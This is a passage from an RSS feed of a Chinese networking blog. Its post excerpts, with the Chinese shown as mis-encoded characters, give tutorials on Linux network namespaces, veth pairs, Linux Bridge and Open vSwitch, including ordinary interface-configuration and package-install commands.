&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># å°†å†…éƒ¨ç«¯å£åˆ†åˆ«ç§»åŠ¨åˆ°netnsä¸­&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet0 netns ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet1 netns ns1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet2 netns ns2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># å¯åŠ¨ç«¯å£å¹¶é…ç½®IP&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> lo up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet0 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ip addr add 10.0.0.1/24 dev vnet0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> lo up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet1 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ip addr add 10.0.0.2/24 dev vnet1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns2 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> lo up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns2 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet2 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns2 ip addr add 10.0.0.3/24 dev vnet2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æµ‹è¯•&lt;/p></description></item><item><title>Open vSwitch å…¥é—¨å®è·µï¼ˆ1ï¼‰Open vSwitch æ˜¯ä»€ä¹ˆ</title><link>https://www.typesafe.cn/posts/ovs-learn-1/</link><pubDate>Wed, 25 Nov 2020 17:49:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/ovs-learn-1/</guid><description>&lt;h1 id="ovsç®€ä»‹">OVSç®€ä»‹&lt;/h1>
&lt;h3 id="open-vswitch-æ˜¯ä»€ä¹ˆ">Open vSwitch æ˜¯ä»€ä¹ˆï¼Ÿ&lt;/h3>
&lt;p>Open vSwitch(ä»¥ä¸‹ç®€ç§°OVS)æ˜¯ä¸€ä¸ªç”¨Cè¯­è¨€å¼€å‘çš„å¤šå±‚è™šæ‹Ÿäº¤æ¢æœºï¼Œä½¿ç”¨Apcahe 2å¼€æºè®¸å¯è¯ï¼Œç°å¦‚ä»ŠåŸºæœ¬ä¸Šå·²ç»æˆä¸ºäº†å¼€æºSDNï¼ˆè½¯ä»¶å®šä¹‰ç½‘ç»œï¼‰åŸºç¡€è®¾æ–½å±‚çš„äº‹å®æ ‡å‡†ã€‚&lt;/p>
&lt;h3 id="ovsæ”¯æŒå“ªäº›åŠŸèƒ½">OVSæ”¯æŒå“ªäº›&lt;a href="http://www.openvswitch.org//features/">åŠŸèƒ½&lt;/a>ï¼Ÿ&lt;/h3>
&lt;ul>
&lt;li>æ”¯æŒNetFlowã€sFlow(R)ã€IPFIXã€SPANã€RSPANå’ŒGREéš§é“é•œåƒç­‰å¤šç§æµé‡ç›‘æ§åè®®&lt;/li>
&lt;li>æ”¯æŒLACP (IEEE 802.1AX-2008)&lt;/li>
&lt;li>æ”¯æŒæ ‡å‡†802.1Q VLANåè®®ï¼Œå…è®¸ç«¯å£é…ç½®trunkæ¨¡å¼&lt;/li>
&lt;li>æ”¯æŒç»„æ’­&lt;/li>
&lt;li>æ”¯æŒBFDå’Œ802.1agé“¾è·¯ç›‘æ§&lt;/li>
&lt;li>æ”¯æŒSTPï¼ˆIEEE 802.1D-1998ï¼‰å’ŒRSTPï¼ˆIEEE 802.1D-2004ï¼‰&lt;/li>
&lt;li>æ”¯æŒç»†ç²’åº¦çš„QoSï¼ˆæœåŠ¡è´¨é‡ï¼‰é…ç½®&lt;/li>
&lt;li>æ”¯æŒHFSC qdisc&lt;/li>
&lt;li>æ”¯æŒæ¥ç®¡æ¯ä¸€ä¸ªè™šæ‹Ÿæœºçš„æµé‡&lt;/li>
&lt;li>æ”¯æŒåŸºäºæºMACçš„è´Ÿè½½å‡è¡¡ã€ä¸»å¤‡æ¨¡å¼å’ŒL4å“ˆå¸Œçš„ç«¯å£ç»‘å¸¦&lt;/li>
&lt;li>æ”¯æŒOpenFlowåè®®ï¼ˆåŒ…å«äº†å¾ˆå¤šå¯¹è™šæ‹ŸåŒ–çš„æ‰©å±•ï¼‰&lt;/li>
&lt;li>æ”¯æŒIPv6&lt;/li>
&lt;li>æ”¯æŒå¤šç§éš§é“åè®®ï¼ˆGREã€VXLANã€STTã€Geneveå’ŒIPsecï¼‰&lt;/li>
&lt;li>æ”¯æŒCå’ŒPythonçš„è¿œç¨‹é…ç½®åè®®&lt;/li>
&lt;li>æ”¯æŒå†…æ ¸å’Œç”¨æˆ·ç©ºé—´çš„è½¬å‘å¼•æ“é€‰é¡¹&lt;/li>
&lt;li>å…·æœ‰æµç¼“å­˜å¼•æ“çš„å¤šè¡¨è½¬å‘ç®¡é“&lt;/li>
&lt;li>è½¬å‘å±‚æŠ½è±¡ä»¥ç®€åŒ–å‘æ–°è½¯ä»¶å’Œç¡¬ä»¶å¹³å°çš„ç§»æ¤&lt;/li>
&lt;/ul>
&lt;h1 id="ovsçš„æœ¯è¯­è§£é‡Š">OVSçš„æœ¯è¯­è§£é‡Š&lt;/h1>
&lt;h3 id="bridge">Bridge&lt;/h3>
&lt;p>ä¸­æ–‡åç§°&lt;strong>ç½‘æ¡¥&lt;/strong>ï¼Œä¸€ä¸ªBridgeä»£è¡¨ä¸€ä¸ªä»¥å¤ªç½‘äº¤æ¢æœºï¼ˆSwitchï¼‰ï¼Œä¸€å°ä¸»æœºä¸­å¯ä»¥åˆ›å»ºä¸€ä¸ªæˆ–å¤šä¸ªBridgeï¼ŒBridgeå¯ä»¥æ ¹æ®ä¸€å®šçš„è§„åˆ™ï¼ŒæŠŠæŸä¸€ä¸ªç«¯å£æ¥æ”¶åˆ°çš„æ•°æ®æŠ¥æ–‡è½¬å‘åˆ°å¦ä¸€ä¸ªæˆ–å¤šä¸ªç«¯å£ä¸Šï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹æˆ–è€…ä¸¢å¼ƒæ•°æ®æŠ¥æ–‡ã€‚&lt;/p>
&lt;h3 id="port">Port&lt;/h3>
&lt;p>ä¸­æ–‡åç§°&lt;strong>ç«¯å£&lt;/strong>ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å®ƒå’ŒTCPé‡Œé¢çš„ç«¯å£ä¸æ˜¯åŒæ ·çš„æ¦‚å¿µï¼Œå®ƒæ›´åƒæ˜¯ç‰©ç†äº¤æ¢æœºä¸Šé¢çš„æ’å£ï¼Œå¯ä»¥æ¥æ°´æ™¶å¤´çš„é‚£ç§ã€‚Portéš¶å±äºBridgeï¼Œå¿…é¡»å…ˆæ·»åŠ äº†Bridgeæ‰èƒ½åœ¨Bridgeä¸Šæ·»åŠ Portã€‚Portæœ‰ä»¥ä¸‹å‡ ç§ç±»å‹ï¼š&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>Normal&lt;/strong>&lt;/p>
&lt;p>ç”¨æˆ·å¯ä»¥æŠŠæ“ä½œç³»ç»Ÿä¸­å·²æœ‰çš„ç½‘å¡æ·»åŠ åˆ°Open vSwicthä¸Šï¼ŒOpen vSwitctä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªåŒåçš„Portå¼€å¤„ç†è¿™å¼ ç½‘å¡è¿›å’Œå‡ºçš„æ•°æ®æŠ¥æ–‡ã€‚&lt;/p>
&lt;blockquote>
&lt;p>ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯è¿™ç§æ–¹å¼æ·»åŠ çš„Portä¸æ”¯æŒåˆ†é…IPåœ°å€ï¼Œå¦‚æœä¹‹å‰ç½‘å¡ä¸Šé…ç½®çš„æœ‰IPï¼ŒæŒ‚è½½åˆ°OVSä¸Šé¢ä¹‹åå°†ä¸å¯è®¿é—®ã€‚æ­¤ç±»å‹çš„Portå¸¸ç”¨äºVLANæ¨¡å¼çš„å¤šå°ç‰©ç†ä¸»æœºç›¸è¿çš„é‚£ä¸ªå£ï¼Œäº¤æ¢æœºä¸€ç«¯å±äºTrunkæ¨¡å¼ã€‚&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Internal&lt;/strong>&lt;/p>
&lt;p>å½“Portçš„ç±»å‹æ˜¯Internalæ—¶ï¼ŒOVSä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿç½‘å¡ï¼ˆInterfaceï¼‰ï¼Œæ­¤ç«¯å£æ”¶åˆ°çš„æ•°æ®æŠ¥æ–‡éƒ½ä¼šè½¬å‘ç»™è¿™å—ç½‘å¡ï¼Œä»è¿™å—ç½‘å¡å‘å‡ºçš„æ•°æ®æŠ¥æ–‡ä¹Ÿä¼šé€šè¿‡Portäº¤ç»™OVSå¤„ç†ã€‚å½“OVSåˆ›å»ºä¸€ä¸ªæ–°çš„ç½‘æ¡¥æ—¶ï¼Œä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªä¸ç½‘æ¡¥åŒåçš„Internal Portï¼ŒåŒæ—¶ä¹Ÿä¼šåˆ›å»ºä¸€ä¸ªä¸ç½‘æ¡¥åŒåçš„Interfaceï¼Œå› æ­¤å¯ä»¥é€šè¿‡ipå‘½ä»¤åœ¨æ“ä½œç³»ç»Ÿä¸­æŸ¥çœ‹åˆ°è¿™å¼ è™šæ‹Ÿç½‘å¡ï¼Œä½†æ˜¯çŠ¶æ€æ˜¯downçš„ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Patch&lt;/strong>&lt;/p>
&lt;p>Patch Portå’Œveth pairåŠŸèƒ½ç›¸åŒï¼Œæ€»æ˜¯æˆåŒæˆå¯¹çš„å‡ºç°ï¼Œåœ¨å…¶ä¸­ä¸€ç«¯æ”¶åˆ°çš„æ•°æ®æŠ¥æ–‡ä¼šè¢«è½¬å‘åˆ°å¦ä¸€ä¸ªPatch Portä¸Šï¼Œå°±åƒæ˜¯ä¸€æ ¹ç½‘çº¿ä¸€æ ·ã€‚Patch Portå¸¸ç”¨äºè¿æ¥ä¸¤ä¸ªBridgeï¼Œè¿™æ ·ä¸¤ä¸ªç½‘æ¡¥å°±å’Œä¸€ä¸ªç½‘æ¡¥ä¸€æ ·äº†ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Tunnel&lt;/strong>&lt;/p>
&lt;p>OVS æ”¯æŒ GREã€VXLANã€STTã€Geneveå’ŒIPsecéš§é“åè®®ï¼Œè¿™äº›éš§é“åè®®å°±æ˜¯overlayç½‘ç»œçš„åŸºç¡€åè®®ï¼Œé€šè¿‡å¯¹ç‰©ç†ç½‘ç»œåšçš„ä¸€å±‚å°è£…å’Œæ‰©å±•ï¼Œè§£å†³äº†äºŒå±‚ç½‘ç»œæ•°é‡ä¸è¶³çš„é—®é¢˜ï¼Œæœ€å¤§é™åº¦çš„å‡å°‘å¯¹åº•å±‚ç‰©ç†ç½‘ç»œæ‹“æ‰‘çš„ä¾èµ–æ€§ï¼ŒåŒæ—¶ä¹Ÿæœ€å¤§é™åº¦çš„å¢åŠ äº†å¯¹ç½‘ç»œçš„æ§åˆ¶ã€‚&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="interface">Interface&lt;/h3>
&lt;p>ï¼ˆiface/æ¥å£ï¼‰æ¥å£æ˜¯OVSä¸æ“ä½œç³»ç»Ÿäº¤æ¢æ•°æ®æŠ¥æ–‡çš„ç»„ä»¶ï¼Œä¸€ä¸ªæ¥å£å³æ˜¯æ“ä½œç³»ç»Ÿä¸Šçš„ä¸€å—ç½‘å¡ï¼Œè¿™ä¸ªç½‘å¡å¯èƒ½æ˜¯OVSç”Ÿæˆçš„è™šæ‹Ÿç½‘å¡ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯æŒ‚è½½åœ¨OVSä¸Šçš„ç‰©ç†ç½‘å¡ï¼Œæ“ä½œç³»ç»Ÿä¸Šçš„è™šæ‹Ÿç½‘å¡ï¼ˆTUN/TAPï¼‰ä¹Ÿå¯ä»¥è¢«æŒ‚è½½åœ¨OVSä¸Šã€‚&lt;/p>
&lt;h3 id="controller">Controller&lt;/h3>
&lt;p>OpenFlowæ§åˆ¶å™¨ï¼ŒOVSå¯ä»¥æ¥æ”¶ä¸€ä¸ªæˆ–è€…å¤šä¸ªOpenFlowæ§åˆ¶å™¨çš„ç®¡ç†ï¼ŒåŠŸèƒ½ä¸»è¦æ˜¯ä¸‹å‘æµè¡¨ï¼Œæ§åˆ¶è½¬å‘è§„åˆ™ã€‚&lt;/p>
&lt;h3 id="flow">Flow&lt;/h3>
&lt;p>æµè¡¨æ˜¯OVSè¿›è¡Œæ•°æ®è½¬å‘çš„æ ¸å¿ƒåŠŸèƒ½ï¼Œå®šä¹‰äº†ç«¯å£ä¹‹é—´è½¬å‘æ•°æ®æŠ¥æ–‡çš„è§„åˆ™ï¼Œä¸€æ¡æµè¡¨è§„åˆ™ä¸»è¦åˆ†ä¸ºåŒ¹é…å’ŒåŠ¨ä½œä¸¤éƒ¨åˆ†ï¼ŒåŒ¹é…éƒ¨åˆ†å†³å®šå“ªäº›æ•°æ®æŠ¥æ–‡éœ€è¦è¢«å¤„ç†ï¼ŒåŠ¨ä½œå†³å®šäº†åŒ¹é…åˆ°çš„æ•°æ®æŠ¥æ–‡è¯¥å¦‚ä½•å¤„ç†ã€‚&lt;/p>
&lt;h1 id="ovså¸¸ç”¨æ“ä½œ">OVSå¸¸ç”¨æ“ä½œ&lt;/h1>
&lt;h3 id="å®‰è£…">å®‰è£…&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum install openvswitch
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>systemctl &lt;span style="color:#8be9fd;font-style:italic">enable&lt;/span> openvswitch
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>systemctl start openvswitch
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;blockquote>
&lt;p>å¦‚æœå½“å‰è½¯ä»¶æºä¸­æ²¡æœ‰openvswitchï¼Œå¯ä»¥é€šè¿‡&lt;a href="https://developer.aliyun.com/packageSearch?word=openvswitch">é˜¿é‡Œäº‘å®˜æ–¹é•œåƒç«™&lt;/a>ä¸‹è½½å’Œæ“ä½œç³»ç»Ÿç‰ˆæœ¬å¯¹åº”çš„rpmåŒ…åˆ°æœ¬åœ°å†å®‰è£…ã€‚ ç¤ºä¾‹å‘½ä»¤ï¼š &lt;code>yum localinstall openvswitch-2.9.0-3.el7.x86_64.rpm&lt;/code>&lt;/p></description></item><item><title>Linux Bridge è¯¦è§£</title><link>https://www.typesafe.cn/posts/linux-bridge/</link><pubDate>Fri, 13 Nov 2020 21:47:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/linux-bridge/</guid><description>&lt;h1 id="linux-bridge-è¯¦è§£">Linux Bridge è¯¦è§£&lt;/h1>
&lt;p>Linux Bridgeï¼ˆç½‘æ¡¥ï¼‰æ˜¯ç”¨çº¯è½¯ä»¶å®ç°çš„è™šæ‹Ÿäº¤æ¢æœºï¼Œæœ‰ç€å’Œç‰©ç†äº¤æ¢æœºç›¸åŒçš„åŠŸèƒ½ï¼Œä¾‹å¦‚äºŒå±‚äº¤æ¢ï¼ŒMACåœ°å€å­¦ä¹ ç­‰ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥æŠŠtun/tapï¼Œveth pairç­‰è®¾å¤‡ç»‘å®šåˆ°ç½‘æ¡¥ä¸Šï¼Œå°±åƒæ˜¯æŠŠè®¾å¤‡è¿æ¥åˆ°ç‰©ç†äº¤æ¢æœºä¸Šä¸€æ ·ã€‚æ­¤å¤–å®ƒå’Œveth pairã€tun/tapä¸€æ ·ï¼Œä¹Ÿæ˜¯ä¸€ç§è™šæ‹Ÿç½‘ç»œè®¾å¤‡ï¼Œå…·æœ‰è™šæ‹Ÿè®¾å¤‡çš„æ‰€æœ‰ç‰¹æ€§ï¼Œä¾‹å¦‚é…ç½®IPï¼ŒMACåœ°å€ç­‰ã€‚&lt;/p>
&lt;p>Linux Bridgeé€šå¸¸æ˜¯æ­é…KVMã€dockerç­‰è™šæ‹ŸåŒ–æŠ€æœ¯ä¸€èµ·ä½¿ç”¨çš„ï¼Œç”¨äºæ„å»ºè™šæ‹Ÿç½‘ç»œï¼Œå› ä¸ºæ­¤æ•™ç¨‹ä¸æ¶‰åŠè™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œæˆ‘ä»¬å°±ä½¿ç”¨å‰é¢å­¦ä¹ è¿‡çš„netnsæ¥æ¨¡æ‹Ÿè™šæ‹Ÿè®¾å¤‡ã€‚&lt;/p>
&lt;h2 id="å¦‚ä½•ä½¿ç”¨linux-bridge">å¦‚ä½•ä½¿ç”¨Linux Bridgeï¼Ÿ&lt;/h2>
&lt;p>æ“ä½œç½‘æ¡¥æœ‰å¤šç§æ–¹å¼ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬ä»‹ç»ä¸€ä¸‹é€šè¿‡&lt;strong>bridge-utils&lt;/strong>æ¥æ“ä½œï¼Œç”±äºå®ƒä¸æ˜¯Linuxç³»ç»Ÿè‡ªå¸¦çš„å·¥å…·ï¼Œå› æ­¤éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨æ¥å®‰è£…å®ƒã€‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># centos&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>yum install -y bridge-utils
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># ubuntu&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apt-get install -y bridge-utils
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä½¿ç”¨&lt;code>brctl help&lt;/code>æŸ¥çœ‹ä½¿ç”¨å¸®åŠ©&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>never heard of &lt;span style="color:#8be9fd;font-style:italic">command&lt;/span> &lt;span style="color:#ff79c6">[&lt;/span>help&lt;span style="color:#ff79c6">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Usage: brctl &lt;span style="color:#ff79c6">[&lt;/span>commands&lt;span style="color:#ff79c6">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>commands:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	addbr 	&amp;lt;bridge&amp;gt;		add bridge
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	delbr 	&amp;lt;bridge&amp;gt;		delete bridge
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	addif 	&amp;lt;bridge&amp;gt; &amp;lt;device&amp;gt;	add interface to bridge
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	delif 	&amp;lt;bridge&amp;gt; &amp;lt;device&amp;gt;	delete interface from bridge
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	hairpin 	&amp;lt;bridge&amp;gt; &amp;lt;port&amp;gt; &lt;span style="color:#ff79c6">{&lt;/span>on|off&lt;span style="color:#ff79c6">}&lt;/span>	turn hairpin on/off
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setageing 	&amp;lt;bridge&amp;gt; &amp;lt;time&amp;gt;		&lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> ageing &lt;span style="color:#8be9fd;font-style:italic">time&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setbridgeprio	&amp;lt;bridge&amp;gt; &amp;lt;prio&amp;gt;		&lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> bridge priority
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setfd 	&amp;lt;bridge&amp;gt; &amp;lt;time&amp;gt;		&lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> bridge forward delay
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	sethello 	&amp;lt;bridge&amp;gt; &amp;lt;time&amp;gt;		&lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> hello &lt;span style="color:#8be9fd;font-style:italic">time&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setmaxage 	&amp;lt;bridge&amp;gt; &amp;lt;time&amp;gt;		&lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> max message age
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setpathcost	&amp;lt;bridge&amp;gt; &amp;lt;port&amp;gt; &amp;lt;cost&amp;gt;	&lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> path cost
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setportprio	&amp;lt;bridge&amp;gt; &amp;lt;port&amp;gt; &amp;lt;prio&amp;gt;	&lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> port priority
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	show 	&lt;span style="color:#ff79c6">[&lt;/span> &amp;lt;bridge&amp;gt; &lt;span style="color:#ff79c6">]&lt;/span>		show a list of bridges
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	showmacs 	&amp;lt;bridge&amp;gt;		show a list of mac addrs
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	showstp 	&amp;lt;bridge&amp;gt;		show bridge stp info
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	stp 	&amp;lt;bridge&amp;gt; &lt;span style="color:#ff79c6">{&lt;/span>on|off&lt;span style="color:#ff79c6">}&lt;/span>	turn stp on/off
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¸¸ç”¨å‘½ä»¤å¦‚&lt;/p></description></item><item><title>Linux veth pair è¯¦è§£</title><link>https://www.typesafe.cn/posts/linux-veth-pair/</link><pubDate>Mon, 09 Nov 2020 22:45:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/linux-veth-pair/</guid><description>&lt;h1 id="linux-veth-pair-è¯¦è§£">Linux veth pair è¯¦è§£&lt;/h1>
&lt;p>veth pairæ˜¯æˆå¯¹å‡ºç°çš„ä¸€ç§è™šæ‹Ÿç½‘ç»œè®¾å¤‡æ¥å£ï¼Œä¸€ç«¯è¿ç€ç½‘ç»œåè®®æ ˆï¼Œä¸€ç«¯å½¼æ­¤ç›¸è¿ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/virtual-device-veth-1.png" alt="virtual-device-veth-1">&lt;/p>
&lt;p>ç”±äºå®ƒçš„è¿™ä¸ªç‰¹æ€§ï¼Œå¸¸å¸¸è¢«ç”¨äºæ„å»ºè™šæ‹Ÿç½‘ç»œæ‹“æ‰‘ã€‚ä¾‹å¦‚è¿æ¥ä¸¤ä¸ªä¸åŒçš„ç½‘ç»œå‘½åç©ºé—´(netns)ï¼Œè¿æ¥dockerå®¹å™¨ï¼Œè¿æ¥ç½‘æ¡¥(Bridge)ç­‰ï¼Œå…¶ä¸­ä¸€ä¸ªå¾ˆå¸¸è§çš„æ¡ˆä¾‹å°±æ˜¯OpenStack Neutronåº•å±‚ç”¨å®ƒæ¥æ„å»ºéå¸¸å¤æ‚çš„ç½‘ç»œæ‹“æ‰‘ã€‚&lt;/p>
&lt;h2 id="å¦‚ä½•ä½¿ç”¨">å¦‚ä½•ä½¿ç”¨ï¼Ÿ&lt;/h2>
&lt;p>åˆ›å»ºä¸€å¯¹veth&lt;/p>
&lt;pre tabindex="0">&lt;code>ip link add &amp;lt;veth name&amp;gt; type veth peer name &amp;lt;peer name&amp;gt;
&lt;/code>&lt;/pre>&lt;h2 id="å®éªŒ">å®éªŒ&lt;/h2>
&lt;p>æˆ‘ä»¬æ”¹é€ ä¸Šä¸€èŠ‚å®Œæˆçš„netnså®éªŒï¼Œä½¿ç”¨veth pairå°†ä¸¤ä¸ªçš„éš”ç¦»netnsè¿æ¥èµ·æ¥ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/vethpair.png" alt="https://oss.typesafe.cn/vethpair.png">&lt;/p>
&lt;p>æˆ‘ä»¬é¦–å…ˆåˆ›å»ºä¸€å¯¹vethè®¾å¤‡ï¼Œå°†vethè®¾å¤‡åˆ†åˆ«ç§»åŠ¨åˆ°ä¸¤ä¸ªnetnsä¸­å¹¶å¯åŠ¨ã€‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># åˆ›å»ºä¸€å¯¹veth&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link add veth0 &lt;span style="color:#8be9fd;font-style:italic">type&lt;/span> veth peer name veth1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># å°†vethç§»åŠ¨åˆ°netnsä¸­&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> veth0 netns ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> veth1 netns ns1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># å¯åŠ¨&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> veth0 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> veth1 up
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ¥ä¸‹æ¥æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹ã€‚&lt;/p>
&lt;p>ä½¿ç”¨&lt;code>ip netns exec ns0 ping 10.0.0.2&lt;/code>åœ¨å‘½åç©ºé—´ns0ä¸­æµ‹è¯•ä¸tap1çš„ç½‘ç»œè¿é€šæ€§ã€‚&lt;/p></description></item><item><title>Linux Network Namespace (netns) è¯¦è§£</title><link>https://www.typesafe.cn/posts/linux-netns/</link><pubDate>Sun, 08 Nov 2020 23:12:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/linux-netns/</guid><description>&lt;p>Network Namespace ï¼ˆä»¥ä¸‹ç®€ç§°netnsï¼‰æ˜¯Linuxå†…æ ¸æä¾›çš„ä¸€é¡¹å®ç°ç½‘ç»œéš”ç¦»çš„åŠŸèƒ½ï¼Œå®ƒèƒ½éš”ç¦»å¤šä¸ªä¸åŒçš„ç½‘ç»œç©ºé—´ï¼Œå¹¶ä¸”å„è‡ªæ‹¥æœ‰ç‹¬ç«‹çš„ç½‘ç»œåè®®æ 